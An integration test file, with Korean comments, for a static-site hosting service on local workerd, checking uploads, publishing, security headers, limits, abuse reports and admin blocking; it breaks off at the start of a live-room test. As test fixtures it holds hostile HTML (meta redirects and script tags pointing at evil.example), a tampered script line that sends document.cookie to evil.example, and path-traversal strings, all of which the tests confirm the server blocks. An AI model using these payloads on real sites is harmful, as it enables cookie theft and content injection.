// 통합 시험: 로컬 workerd(wrangler dev)에 실제 엔진이 만든 사이트(sel-story = `npm run examples`의 .out/sel-story와 같은 파일)를
// 앱과 같은 순서로 올려 봅니다. workerd를 띄울 수 없는 곳에서는 까닭을 적고 건너뜁니다.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, randomBytes } from 'node:crypto';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { HOSTING, buildSite, manifestOf, sha256, startHost, call, deploy } from './helpers.mjs';

const ADMIN = 'it-admin-' + randomBytes(12).toString('hex');
const te = new TextEncoder();
const hosts = [];
let skip = '';
async function host(vars) {
  if (skip) return null;
  if (!existsSync(join(HOSTING, 'node_modules', 'wrangler', 'bin', 'wrangler.js'))) { skip = 'wrangler가 설치되지 않았어요(hosting에서 npm install).'; return null; }
  try { const h = await startHost(vars); hosts.push(h); return h; } catch (e) { skip = `workerd(wrangler dev)를 띄우지 못해 통합 시험을 건너뜁니다: ${String(e.message).split('\n')[0]}`; console.error(e.message); return null; }
}
after(async () => { for (const h of hosts) await h.stop(); });

const code = (r) => r.body?.error?.code;
const bin = async (url, init) => { const r = await fetch(url, init); return { status: r.status, headers: r.headers, bytes: new Uint8Array(await r.arrayBuffer()) }; };
const text = async (url, init) => { const r = await fetch(url, { redirect: 'manual', ...init }); return { status: r.status, headers: r.headers, text: await r.text() }; };
const PNG = Uint8Array.from(atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='), (c) => c.charCodeAt(0));
const newSite = async (base, title = '통합 시험') => { const r = await call(base, 'POST', '/api/sites', { json: { title } }); assert.equal(r.status, 201, JSON.stringify(r.body)); return r.body; };

test('바로 공개: 만들기 → 올리기 → 공개 → 고쳐 올리기 → 지우기', async (t) => {
  const h = await host({ ADMIN_KEY: ADMIN, SITES_PER_HOUR: 100, SITES_PER_DAY: 1000, MAX_FILE_BYTES: 3000000, MAX_BYTES: 8000000, MAX_FILES: 60, REPORTS_PER_HOUR: 3 });
  if (!h) return t.skip(skip);
  const base = h.url;
  const files = await buildSite('sel-story', { assets: { 'assets/files/연수_활동지_최종_.pdf': te.encode('%PDF-1.4\n%%EOF\n'), 'assets/media/사진 (1).png': PNG, 'assets/files/명단.csv': te.encode('이름,학교\n') } });
  let site; let firstExpiry;

  await t.test('안내: /api/info, 정적 화면, CORS', async () => {
    const info = await call(base, 'GET', '/api/info');
    assert.equal(info.status, 200);
    assert.deepEqual(info.body, { ok: true, v: 1, plan: 'free', accepting: true, limits: { maxBytes: 8000000, maxFileBytes: 3000000, maxFiles: 60, days: 30 }, report: `${base}/report`, live: { url: `${base}/live`, uploads: true, maxUploadMb: 10 } });
    const home = await text(`${base}/`);
    assert.equal(home.status, 200); assert.ok(home.text.includes('바로 공개') && home.text.includes('href="/report"'));
    assert.ok(home.headers.get('content-security-policy').includes("default-src 'none'"));
    const report = await text(`${base}/report?site=abcdefghjk`);
    assert.equal(report.status, 200); assert.ok(report.text.includes('신고') && report.text.includes('src="/report.js"') && !/<script(?![^>]*src=)/.test(report.text), '신고 화면에 인라인 스크립트 없음');
    assert.equal((await text(`${base}/report.js`)).status, 200);
    assert.equal((await text(`${base}/robots.txt`)).text, 'User-agent: *\nDisallow: /\n');
    assert.equal((await text(`${base}/없는-주소`)).status, 404);
    // CORS: 허용한 앱 주소만
    const pre = await fetch(`${base}/api/sites`, { method: 'OPTIONS', headers: { origin: 'http://localhost:5173', 'access-control-request-method': 'POST', 'access-control-request-headers': 'authorization,content-type' } });
    assert.equal(pre.status, 204);
    assert.equal(pre.headers.get('access-control-allow-origin'), 'http://localhost:5173');
    assert.equal(pre.headers.get('access-control-allow-methods'), 'GET,POST,PUT,DELETE,OPTIONS');
    assert.equal(pre.headers.get('access-control-allow-headers'), 'authorization,content-type');
    assert.equal(pre.headers.get('access-control-max-age'), '86400');
    const okOrigin = await call(base, 'GET', '/api/info', { headers: { origin: 'https://yoorrard.github.io' } });
    assert.equal(okOrigin.headers.get('access-control-allow-origin'), 'https://yoorrard.github.io');
    const evil = await call(base, 'POST', '/api/sites', { json: {}, headers: { origin: 'https://evil.example' } });
    assert.equal(evil.status, 403); assert.equal(evil.headers.get('access-control-allow-origin'), null);
    // 올라온 사이트(같은 출처)의 화면이 API를 부르는 것도 막음
    const same = await call(base, 'POST', '/api/sites', { json: {}, headers: { origin: base } });
    assert.equal(same.status, 403);
  });

  await t.test('사이트 만들기: 주소·열쇠·공개 기간', async () => {
    const before = Date.now();
    site = await newSite(base, '마음이 먼저 도착하는 교실');
    assert.match(site.id, /^[0-9a-hjkmnp-tv-z]{10}$/);
    assert.match(site.key, /^[A-Za-z0-9_-]{43}$/);
    assert.equal(site.url, `${base}/s/${site.id}/`);
    assert.ok(site.expiresAt >= before + 30 * 86400000 - 1000 && site.expiresAt <= Date.now() + 30 * 86400000 + 1000);
    firstExpiry = site.expiresAt;
    assert.equal((await text(`${base}/s/${site.id}/`)).status, 404, '올리기 전에는 없음');
    assert.equal((await call(base, 'POST', '/api/sites', {})).status, 201, '본문 없이도 됨');
    assert.equal(code(await call(base, 'POST', '/api/sites', { raw: te.encode('{nope') })), 'bad_request');
  });

  await t.test('없는 사이트·틀린 열쇠', async () => {
    const m = { files: manifestOf(files) };
    assert.equal((await call(base, 'POST', `/api/sites/${site.id}/deploys`, { json: m })).status, 401);
    const wrong = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: 'x'.repeat(43), json: m });
    assert.equal(wrong.status, 401); assert.equal(code(wrong), 'unauthorized');
    for (const id of ['0000000000', 'zzzzzzzzzz', 'abcdefghjk']) {
      const r = await call(base, 'POST', `/api/sites/${id}/deploys`, { key: site.key, json: m });
      assert.equal(r.status, 404); assert.equal(code(r), 'not_found');
      const page = await text(`${base}/s/${id}/`);
      assert.equal(page.status, 404); assert.ok(page.text.includes('이 사이트는 공개 기간이 끝났어요'));
    }
    assert.equal((await call(base, 'POST', '/api/sites/NOT-AN-ID/deploys', { key: site.key, json: m })).status, 404);
    assert.equal((await text(`${base}/s/NOT-AN-ID/`)).status, 404);
    assert.equal((await call(base, 'GET', '/api/info')).status, 200, '없는 주소를 두드려도 서버는 멀쩡함');
  });

  let deployId; let missing;
  await t.test('배포 목록: 없는 파일 목록을 돌려줌, _headers는 받지 않고 넘김', async () => {
    assert.ok('_headers' in files);
    const d = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf(files) } });
    assert.equal(d.status, 200, JSON.stringify(d.body));
    assert.match(d.body.deploy, /^[0-9a-hjkmnp-tv-z]{16}$/);
    const want = new Set(Object.entries(files).filter(([p]) => p !== '_headers').map(([, v]) => sha256(v)));
    assert.deepEqual(new Set(d.body.missing), want);
    assert.equal(d.body.missing.length, want.size, '겹치지 않게');
    deployId = d.body.deploy; missing = d.body.missing;
  });

  await t.test('파일 올리기: 내용 확인, 다시 보내도 됨, 덜 올리고 공개하면 missing_blobs', async () => {
    const bySha = new Map(Object.values(files).map((v) => [sha256(v), v]));
    const [last, ...rest] = missing;
    const bad = await call(base, 'PUT', `/api/sites/${site.id}/blobs/${last}`, { key: site.key, raw: te.encode('다른 내용') });
    assert.ok(bad.status === 400 || bad.status === 413, `내용이 다르면 거절(${bad.status})`);
    const unknown = sha256('목록에 없는 파일');
    assert.equal(code(await call(base, 'PUT', `/api/sites/${site.id}/blobs/${unknown}`, { key: site.key, raw: te.encode('목록에 없는 파일') })), 'bad_request');
    assert.equal((await call(base, 'PUT', `/api/sites/${site.id}/blobs/${last}`, { raw: bySha.get(last) })).status, 401);
    assert.equal(code(await call(base, 'PUT', `/api/sites/${site.id}/blobs/nothex`, { key: site.key, raw: te.encode('x') })), 'bad_request');
    for (const sha of rest) assert.equal((await call(base, 'PUT', `/api/sites/${site.id}/blobs/${sha}`, { key: site.key, raw: bySha.get(sha) })).status, 204, sha);
    assert.equal((await call(base, 'PUT', `/api/sites/${site.id}/blobs/${rest[0]}`, { key: site.key, raw: bySha.get(rest[0]) })).status, 204, '같은 파일을 다시 보내도 204');
    const early = await call(base, 'POST', `/api/sites/${site.id}/deploys/${deployId}/publish`, { key: site.key });
    assert.equal(early.status, 409); assert.equal(code(early), 'missing_blobs'); assert.deepEqual(early.body.error.missing, [last]);
    assert.equal((await text(`${base}/s/${site.id}/`)).status, 404, '아직 공개 전');
    assert.equal((await call(base, 'PUT', `/api/sites/${site.id}/blobs/${last}`, { key: site.key, raw: bySha.get(last) })).status, 204);
  });

  await t.test('공개', async () => {
    assert.equal((await call(base, 'POST', `/api/sites/${site.id}/deploys/${deployId}/publish`, {})).status, 401);
    assert.equal((await call(base, 'POST', `/api/sites/${site.id}/deploys/0000000000000000/publish`, { key: site.key })).status, 404);
    const p = await call(base, 'POST', `/api/sites/${site.id}/deploys/${deployId}/publish`, { key: site.key });
    assert.equal(p.status, 200, JSON.stringify(p.body));
    assert.equal(p.body.url, site.url);
    assert.ok(p.body.expiresAt >= firstExpiry, '공개하면 그때부터 30일');
    const again = await call(base, 'POST', `/api/sites/${site.id}/deploys/${deployId}/publish`, { key: site.key });
    assert.equal(again.status, 200); assert.deepEqual(again.body, p.body, '응답을 못 받아 다시 불러도 같은 답');
  });

  await t.test('사이트 열기: 머리글·CSP·304·HEAD·한글 파일 이름', async () => {
    const dir = await text(`${base}/s/${site.id}`);
    assert.equal(dir.status, 308); assert.equal(dir.headers.get('location'), `/s/${site.id}/`);
    const idx = await text(site.url);
    assert.equal(idx.status, 200);
    assert.equal(idx.headers.get('content-type'), 'text/html; charset=utf-8');
    const csp = idx.headers.get('content-security-policy');
    assert.ok(csp.includes("default-src 'none'") && csp.includes("script-src 'self';") && csp.includes("form-action 'none'") && csp.includes("base-uri 'none'") && csp.includes("object-src 'none'") && csp.includes("frame-src 'none'"), csp);
    assert.ok(!csp.includes('frame-ancestors'));
    assert.equal(idx.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(idx.headers.get('referrer-policy'), 'strict-origin-when-cross-origin');
    assert.equal(idx.headers.get('permissions-policy'), 'camera=(), microphone=(), geolocation=()');
    assert.equal(idx.headers.get('x-robots-tag'), 'noindex, nofollow');
    assert.equal(idx.headers.get('cache-control'), 'no-cache');
    assert.equal(idx.headers.get('etag'), `"${sha256(files['index.html'])}-r1"`);
    assert.ok(idx.text.includes('<script type="application/json" id="lp-data">'), '자료 블록은 그대로');
    assert.ok(idx.text.includes('<script src="assets/lecpage.js" defer></script>'));
    assert.ok(idx.text.includes(`<a href="/report?site=${site.id}" rel="nofollow noopener" target="_blank" data-host-report>신고</a></div>`), '바닥글에 신고 링크');
    assert.equal((await text(`${site.url}index.html`)).text, idx.text);
    // 304
    const not = await fetch(site.url, { headers: { 'if-none-match': idx.headers.get('etag') } });
    assert.equal(not.status, 304); assert.equal(not.headers.get('etag'), idx.headers.get('etag'));
    assert.equal((await fetch(site.url, { headers: { 'if-none-match': '"other"' } })).status, 200);
    // HEAD
    const head = await fetch(site.url, { method: 'HEAD' });
    assert.equal(head.status, 200); assert.equal(await head.text(), ''); assert.equal(head.headers.get('etag'), idx.headers.get('etag'));
    assert.equal((await fetch(site.url, { method: 'POST' })).status, 405);
    // 강사용 화면: 다른 사이트의 틀에 못 넣음, 신고 링크 없음
    for (const p of ['console.html', 'screen.html', 'poster.html']) {
      const r = await text(site.url + p);
      assert.equal(r.status, 200, p);
      assert.ok(r.headers.get('content-security-policy').endsWith("frame-ancestors 'none'"), p);
      assert.equal(r.headers.get('x-frame-options'), 'DENY');
      assert.ok(!r.text.includes('data-host-report'), p);
    }
    const check = await text(`${site.url}check.html`);
    assert.ok(check.text.includes('data-host-report') && check.text.includes(`/report?site=${site.id}`), '바닥글이 없는 화면은 본문 끝에');
    assert.equal((await text(`${site.url}check`)).status, 200, '확장자 없이도 .html을 찾음');
    // 실행 파일: 올린 그대로
    const js = await bin(`${site.url}assets/lecpage.js`);
    assert.equal(js.status, 200);
    assert.deepEqual(js.bytes, files['assets/lecpage.js']);
    assert.equal(js.headers.get('content-type'), 'text/javascript; charset=utf-8');
    assert.equal(js.headers.get('cache-control'), 'public, max-age=600');
    assert.equal(js.headers.get('etag'), `"${sha256(files['assets/lecpage.js'])}"`);
    assert.equal(js.headers.get('cross-origin-resource-policy'), 'same-origin');
    assert.equal(js.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(js.headers.get('content-security-policy'), null);
    assert.equal((await fetch(`${site.url}assets/lecpage.js`, { headers: { 'if-none-match': js.headers.get('etag') } })).status, 304);
    const css = await bin(`${site.url}assets/theme.css`);
    assert.equal(css.headers.get('content-type'), 'text/css; charset=utf-8'); assert.deepEqual(css.bytes, files['assets/theme.css']);
    // SVG: 가둔 채로. 앱이 다른 출처에서 그림으로 불러 확인하므로 same-origin 제한은 없음
    const svg = await bin(`${site.url}assets/favicon.svg?t=1`);
    assert.equal(svg.headers.get('content-type'), 'image/svg+xml');
    assert.equal(svg.headers.get('content-security-policy'), "default-src 'none'; style-src 'unsafe-inline'; sandbox");
    assert.equal(svg.headers.get('cross-origin-resource-policy'), null);
    const robots = await text(`${site.url}robots.txt`);
    assert.equal(robots.headers.get('content-type'), 'text/plain; charset=utf-8'); assert.equal(robots.text, 'User-agent: *\nDisallow: /\n');
    // 한글 이름·내려받기 자료
    const pdf = await bin(site.url + encodeURI('assets/files/연수_활동지_최종_.pdf'));
    assert.equal(pdf.status, 200); assert.equal(pdf.headers.get('content-type'), 'application/pdf'); assert.equal(pdf.headers.get('content-disposition'), null);
    assert.deepEqual(pdf.bytes, files['assets/files/연수_활동지_최종_.pdf']);
    const csv = await bin(site.url + encodeURI('assets/files/명단.csv'));
    assert.equal(csv.status, 200); assert.equal(csv.headers.get('content-disposition'), 'attachment'); assert.equal(csv.headers.get('content-type'), 'text/csv; charset=utf-8');
    const img = await bin(site.url + encodeURI('assets/media/사진 (1).png'));
    assert.equal(img.status, 200); assert.equal(img.headers.get('content-type'), 'image/png'); assert.deepEqual(img.bytes, PNG);
    // 없는 것
    const nope = await text(`${site.url}nope.html`);
    assert.equal(nope.status, 404); assert.ok(nope.text.includes('없는 페이지'));
    assert.equal((await text(`${site.url}_headers`)).status, 404, '올라온 _headers는 받지도 내보내지도 않음');
    for (const p of ['..%2f..%2fapi/info', '%2e%2e/x', 'assets/%00.js', 'assets//lecpage.js', '.env']) assert.equal((await text(site.url + p)).status, 404, p);
  });

  let v2;
  await t.test('고쳐 올리기: 바뀐 파일만 올림. HTML은 내보낼 때 손봄', async () => {
    const evil = `<!doctype html><html><head><meta charset="utf-8"><title>x</title>
<meta http-equiv="refresh" content="0;url=https://evil.example/"><META HTTP-EQUIV=" Refresh " content="1;url=//evil.example">
<base href="https://evil.example/"><meta name="keep" content="1">
<script src="https://evil.example/a.js"></script><script src="//evil.example/b.js"></script><script src="/report.js"></script>
<script src="ht\ntps://evil.example/c.js"></script><script src="data:text/javascript,alert(1)"></script>
<script src="assets/boot.js"></script><script type="application/json" id="d">{"a":"</b>"}</script>
</head><body><p id="keep">본문</p><object data="x.swf"><p>안쪽</p></object><embed src="x.swf">
<form action="https://evil.example/"><input name="pw"></form><script>window.inline = 1</script></body></html>`;
    v2 = { ...files, 'index.html': te.encode(new TextDecoder().decode(files['index.html']).replace('</body>', '<p id="v2">두 번째</p></body>')), 'extra.html': te.encode(evil), '404.html': te.encode('<!doctype html><title>없음</title><body><h1>이 사이트의 404</h1></body>') };
    const d = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf(v2) } });
    assert.equal(d.status, 200);
    assert.deepEqual(new Set(d.body.missing), new Set([sha256(v2['index.html']), sha256(v2['extra.html']), sha256(v2['404.html'])]), '바뀐 파일만');
    assert.ok(!(await text(site.url)).text.includes('id="v2"'), '공개 전에는 예전 것');
    const r = await deploy(base, site, v2);
    assert.equal(r.status, 200, JSON.stringify(r.body));
    assert.equal(r.missing.length, 3);
    assert.ok(r.body.expiresAt >= firstExpiry);
    const idx = await text(site.url);
    assert.ok(idx.text.includes('id="v2"'));
    assert.equal(idx.headers.get('etag'), `"${sha256(v2['index.html'])}-r1"`);
    const x = await text(`${site.url}extra.html`);
    assert.equal(x.status, 200);
    for (const gone of ['refresh', 'Refresh', '<base', 'evil.example/a.js', 'evil.example/b.js', '/report.js', 'evil.example/c.js', 'data:text/javascript', '<object', '<embed', '안쪽']) assert.ok(!x.text.includes(gone), `빠져야 함: ${gone}`);
    for (const kept of ['<meta name="keep" content="1">', '<script src="assets/boot.js"></script>', '<script type="application/json" id="d">{"a":"</b>"}</script>', '<p id="keep">본문</p>', 'data-host-report']) assert.ok(x.text.includes(kept), `남아야 함: ${kept}`);
    assert.ok(x.headers.get('content-security-policy').includes("script-src 'self';"), '인라인 스크립트·form은 CSP가 막음');
    const nf = await text(`${site.url}nothing-here`);
    assert.equal(nf.status, 404); assert.ok(nf.text.includes('이 사이트의 404'), '사이트의 404.html');
    const same = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf(v2) } });
    assert.deepEqual(same.body.missing, [], '그대로면 올릴 것이 없음');
  });

  await t.test('실행 파일은 엔진 런타임만: 손댄 .js는 거절하고 공개된 사이트는 그대로', async () => {
    const tampered = te.encode(new TextDecoder().decode(v2['assets/lecpage.js']) + '\n;fetch("https://evil.example/?c="+document.cookie)');
    const bad = { ...v2, 'assets/lecpage.js': tampered };
    const r = await deploy(base, site, bad);
    assert.equal(r.step, 'blobs'); assert.equal(r.status, 422); assert.equal(code(r), 'runtime_mismatch');
    const d = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf(bad) } });
    const pub = await call(base, 'POST', `/api/sites/${site.id}/deploys/${d.body.deploy}/publish`, { key: site.key });
    assert.equal(pub.status, 409); assert.equal(code(pub), 'missing_blobs');
    // 돌아가는 길: 먼저 다른 이름(.txt)으로 올려 두고, 다음 배포에서 같은 내용을 .js로 가리킴
    const evil = te.encode('alert(document.domain)');
    const step1 = await deploy(base, site, { ...v2, 'assets/media/note.txt': evil });
    assert.equal(step1.status, 200, '글자 파일로는 올라감');
    const step2 = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf({ ...v2, 'assets/media/note.txt': evil, 'assets/evil.js': evil }) } });
    assert.deepEqual(step2.body.missing, [], '이미 있는 내용');
    const pub2 = await call(base, 'POST', `/api/sites/${site.id}/deploys/${step2.body.deploy}/publish`, { key: site.key });
    assert.equal(pub2.status, 422); assert.equal(code(pub2), 'runtime_mismatch'); assert.equal(pub2.body.error.path, 'assets/evil.js');
    assert.equal((await text(`${site.url}assets/evil.js`)).status, 404);
    const note = await text(`${site.url}assets/media/note.txt`);
    assert.equal(note.headers.get('content-type'), 'text/plain; charset=utf-8', '스크립트로 읽히지 않는 형식');
    assert.equal(note.headers.get('x-content-type-options'), 'nosniff');
    assert.deepEqual((await bin(`${site.url}assets/lecpage.js`)).bytes, v2['assets/lecpage.js'], '공개된 것은 그대로');
    // 큰 .js, 다른 이름의 스크립트
    assert.equal(code(await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: { ...manifestOf(v2), 'assets/big.js': { sha256: sha256('x'), size: 1024 * 1024 + 1 } } } })), 'runtime_mismatch');
    assert.equal(code(await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: { ...manifestOf(v2), 'assets/x.mjs': { sha256: sha256('x'), size: 1 } } } })), 'bad_type');
    await deploy(base, site, v2); // 뒤 시험을 위해 깨끗한 목록으로
  });

  await t.test('한도: 큰 파일·큰 사이트·파일 수·이름·형식', async () => {
    const m = manifestOf(v2);
    const post = (filesMap) => call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: filesMap } });
    const big = await post({ ...m, 'assets/media/big.png': { sha256: sha256('big'), size: 3000001 } });
    assert.equal(big.status, 413); assert.equal(code(big), 'too_large');
    const total = await post({ ...m, 'a.png': { sha256: sha256('a'), size: 3000000 }, 'b.png': { sha256: sha256('b'), size: 3000000 }, 'c.png': { sha256: sha256('c'), size: 2000000 } });
    assert.equal(total.status, 413); assert.equal(code(total), 'too_large');
    const many = await post({ ...m, ...Object.fromEntries(Array.from({ length: 60 }, (_, i) => [`p${i}.png`, { sha256: sha256('p'), size: 1 }])) });
    assert.equal(many.status, 413); assert.equal(code(many), 'too_many_files');
    for (const p of ['../x.png', '/x.png', 'a//b.png', '.env.txt', 'a\\b.png', 'a<b>.html']) assert.equal(code(await post({ ...m, [p]: { sha256: sha256('x'), size: 1 } })), 'bad_path', p);
    for (const p of ['x.php', 'x.exe', 'x.htm', 'noext']) { const r = await post({ ...m, [p]: { sha256: sha256('x'), size: 1 } }); assert.equal(r.status, 415, p); assert.equal(code(r), 'bad_type'); }
    const noIndex = { ...m }; delete noIndex['index.html'];
    assert.equal(code(await post(noIndex)), 'bad_request');
    // 목록에 적은 것보다 큰 내용
    const body = te.encode('작은 파일');
    const d = await post({ ...m, 'assets/media/s.txt': { sha256: sha256(body), size: body.length } });
    const over = await call(base, 'PUT', `/api/sites/${site.id}/blobs/${sha256(body)}`, { key: site.key, raw: new Uint8Array(body.length + 5000) });
    assert.ok(over.status === 413 || over.status === 400, String(over.status));
    assert.equal((await call(base, 'PUT', `/api/sites/${site.id}/blobs/${sha256(body)}`, { key: site.key, raw: new Uint8Array(4000000) })).status, 413, '한도보다 큰 본문');
    assert.deepEqual(d.body.missing, [sha256(body)]);
  });

  await t.test('큰 파일: 1MiB씩 나눠 담고 그대로 돌려줌, Range', async () => {
    const big = randomBytes(2 * 1024 * 1024 + 12345);
    const files3 = { ...v2, 'assets/media/수업 영상.mp4': new Uint8Array(big) };
    const r = await deploy(base, site, files3);
    assert.equal(r.status, 200, JSON.stringify(r.body));
    const url = site.url + encodeURI('assets/media/수업 영상.mp4');
    const all = await bin(url);
    assert.equal(all.status, 200); assert.equal(all.headers.get('content-type'), 'video/mp4'); assert.equal(all.headers.get('accept-ranges'), 'bytes');
    assert.equal(createHash('sha256').update(all.bytes).digest('hex'), sha256(big));
    const a = 1024 * 1024 - 10; const b = 1024 * 1024 + 9;
    const part = await bin(url, { headers: { range: `bytes=${a}-${b}` } });
    assert.equal(part.status, 206); assert.equal(part.headers.get('content-range'), `bytes ${a}-${b}/${big.length}`);
    assert.deepEqual(part.bytes, new Uint8Array(big.subarray(a, b + 1)), '줄 경계를 넘는 구간');
    const tail = await bin(url, { headers: { range: 'bytes=-100' } });
    assert.equal(tail.status, 206); assert.deepEqual(tail.bytes, new Uint8Array(big.subarray(big.length - 100)));
    const bad = await bin(url, { headers: { range: `bytes=${big.length}-` } });
    assert.equal(bad.status, 416); assert.equal(bad.headers.get('content-range'), `bytes */${big.length}`);
    const head = await fetch(url, { method: 'HEAD' });
    assert.equal(head.headers.get('content-length'), String(big.length));
    // 다시 올리면 안 쓰는 파일은 지워짐(전체 저장량에 반영)
    const before = (await call(base, 'GET', '/api/admin/sites', { key: ADMIN })).body.sites.find((s) => s.id === site.id).bytes;
    await deploy(base, site, v2);
    const after2 = (await call(base, 'GET', '/api/admin/sites', { key: ADMIN })).body.sites.find((s) => s.id === site.id).bytes;
    assert.ok(before - after2 >= big.length, `${before} → ${after2}`);
    assert.equal((await bin(url)).status, 404);
  });

  await t.test('암호로 잠근 사이트(unlock.js, *.enc)도 받음', async () => {
    const locked = await buildSite('sel-story', { password: '봄날1234', assets: { 'assets/media/사진 (1).png': PNG } });
    assert.ok('assets/unlock.js' in locked && 'assets/media/사진 (1).png.enc' in locked);
    const s = await newSite(base, '잠근 사이트');
    const r = await deploy(base, s, locked);
    assert.equal(r.status, 200, JSON.stringify(r.body));
    const page = await text(s.url);
    assert.ok(page.text.includes('id="lp-locked"') && page.text.includes('<script src="assets/unlock.js"></script>') && page.text.includes('data-host-report'));
    const enc = await bin(s.url + encodeURI('assets/media/사진 (1).png.enc'));
    assert.equal(enc.status, 200); assert.equal(enc.headers.get('content-type'), 'application/octet-stream'); assert.deepEqual(enc.bytes, locked['assets/media/사진 (1).png.enc']);
    assert.deepEqual((await bin(`${s.url}assets/unlock.js`)).bytes, locked['assets/unlock.js']);
  });

  await t.test('신고 → 관리자: 목록 보기, 가리기(451), 풀기', async () => {
    const r = await call(base, 'POST', '/api/report', { json: { site: site.url, reason: '교과서 그림이 허락 없이 실려 있어요.', contact: 'owner@example.com' }, headers: { origin: base } });
    assert.equal(r.status, 200, JSON.stringify(r.body)); assert.deepEqual(r.body, { ok: true });
    assert.equal((await call(base, 'POST', '/api/report', { json: { site: site.id, reason: '두 번째' } })).status, 200);
    for (const bad of [{ site: 'nope', reason: 'x' }, { site: site.id, reason: '' }, { site: site.id, reason: 'x'.repeat(2001) }, { site: site.id, reason: 'x', contact: 'c'.repeat(201) }, { reason: 'x' }]) assert.equal(code(await call(base, 'POST', '/api/report', { json: bad })), 'bad_request');
    assert.equal((await call(base, 'POST', '/api/report', { json: { site: site.id, reason: '세 번째' } })).status, 200);
    const limited = await call(base, 'POST', '/api/report', { json: { site: site.id, reason: '네 번째' } });
    assert.equal(limited.status, 429); assert.equal(code(limited), 'rate_limited'); assert.ok(Number(limited.headers.get('retry-after')) > 0);
    assert.equal((await call(base, 'POST', '/api/report', { json: { site: site.id, reason: 'x' }, headers: { origin: 'https://evil.example' } })).status, 403);
    // 관리자
    assert.equal((await call(base, 'GET', '/api/admin/reports')).status, 401);
    assert.equal((await call(base, 'GET', '/api/admin/reports', { key: 'wrong' })).status, 401);
    assert.equal((await call(base, 'GET', '/api/admin/reports', { key: site.key })).status, 401, '사이트 열쇠로는 안 됨');
    const list = await call(base, 'GET', '/api/admin/reports', { key: ADMIN });
    assert.equal(list.status, 200); assert.equal(list.body.reports.length, 3);
    assert.deepEqual({ site: list.body.reports[2].site, reason: list.body.reports[2].reason, contact: list.body.reports[2].contact }, { site: site.id, reason: '교과서 그림이 허락 없이 실려 있어요.', contact: 'owner@example.com' });
    const sites = await call(base, 'GET', '/api/admin/sites', { key: ADMIN });
    assert.ok(sites.body.total.sites >= 2 && sites.body.total.bytes > 0);
    const mine = sites.body.sites.find((s) => s.id === site.id);
    assert.ok(mine && mine.bytes > 300000 && mine.blocked === false);
    // 가리기
    assert.equal(code(await call(base, 'POST', `/api/admin/sites/${site.id}/block`, { key: ADMIN, json: { blocked: 'yes' } })), 'bad_request');
    assert.equal((await call(base, 'POST', `/api/admin/sites/zzzzzzzzzz/block`, { key: ADMIN, json: { blocked: true } })).status, 404);
    const b = await call(base, 'POST', `/api/admin/sites/${site.id}/block`, { key: ADMIN, json: { blocked: true, reason: '저작권 신고 확인 중' } });
    assert.equal(b.status, 200); assert.equal(b.body.blocked, true);
    const page = await text(site.url);
    assert.equal(page.status, 451); assert.ok(page.text.includes('잠시 가려 둔 사이트') && page.text.includes(`/report?site=${site.id}`));
    assert.equal((await text(`${site.url}assets/lecpage.js`)).status, 451);
    const d = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf(v2) } });
    assert.equal(d.status, 403); assert.equal(code(d), 'blocked');
    assert.equal((await call(base, 'GET', '/api/admin/sites', { key: ADMIN })).body.sites.find((s) => s.id === site.id).blocked, true);
    assert.equal((await call(base, 'POST', `/api/admin/sites/${site.id}/block`, { key: ADMIN, json: { blocked: false } })).status, 200);
    assert.equal((await text(site.url)).status, 200);
  });

  await t.test('지우기: 열쇠가 맞아야 하고, 지우면 404', async () => {
    assert.equal((await call(base, 'DELETE', `/api/sites/${site.id}`, { key: 'x'.repeat(43) })).status, 401);
    assert.equal((await call(base, 'DELETE', `/api/sites/${site.id}`)).status, 401);
    assert.equal((await text(site.url)).status, 200);
    assert.equal((await call(base, 'DELETE', `/api/sites/${site.id}`, { key: site.key })).status, 204);
    const gone = await text(site.url);
    assert.equal(gone.status, 404); assert.ok(gone.text.includes('이 사이트는 공개 기간이 끝났어요'));
    assert.equal((await text(`${site.url}assets/lecpage.js`)).status, 404);
    const d = await call(base, 'POST', `/api/sites/${site.id}/deploys`, { key: site.key, json: { files: manifestOf(v2) } });
    assert.equal(d.status, 404); assert.equal(code(d), 'not_found');
    assert.equal((await call(base, 'DELETE', `/api/sites/${site.id}`, { key: site.key })).status, 404);
    assert.ok(!(await call(base, 'GET', '/api/admin/sites', { key: ADMIN })).body.sites.some((s) => s.id === site.id), '목록·저장량에서 빠짐');
    // 관리자가 지우기
    const s2 = await newSite(base);
    assert.equal((await deploy(base, s2, files)).status, 200);
    assert.equal((await call(base, 'DELETE', `/api/admin/sites/${s2.id}`, { key: ADMIN })).status, 204);
    assert.equal((await text(s2.url)).status, 404);
  });

  // ── 실시간 방 ────────────────────────────────────────────────
  await t.test('실시간: 사이트에 방 묶기 → 참여 → 질문 → 강사가 봄 → 보드 파일 → 사이트를 지우면 방·파일도 사라짐', async () => {
    const CODE = 'IT' + randomBytes(3).toString('hex').toUpperCase();
    const TEACHER = '강사키-' + randomBytes(8).toString('hex');
    const hash = sha256(TEACHER);
    const live = `${base}/live/api/${CODE}`;
    const lv = (method, path, { json, token, admin, headers = {}, body } = {}) => {
      const hd = { ...headers };
      if (token) hd['x-lec-token'] = token;
      if (admin) hd['x-lec-admin'] = encodeURIComponent(admin);
      if (json !== undefined) hd['content-type'] = 'application/json';
      return fetch(live + path, { method, headers: hd, body: json !== undefined ? JSON.stringify(json) : body }).then(async (r) => ({ status: r.status, headers: r.headers, body: await r.json().catch(() => null) }));
    };
    assert.deepEqual((await (await fetch(`${base}/live/api/health`)).json()), { ok: true, protocol: 1, uploads: true, runtime: 'cloudflare' });

    // 사이트: 실시간을 이 호스트의 방으로
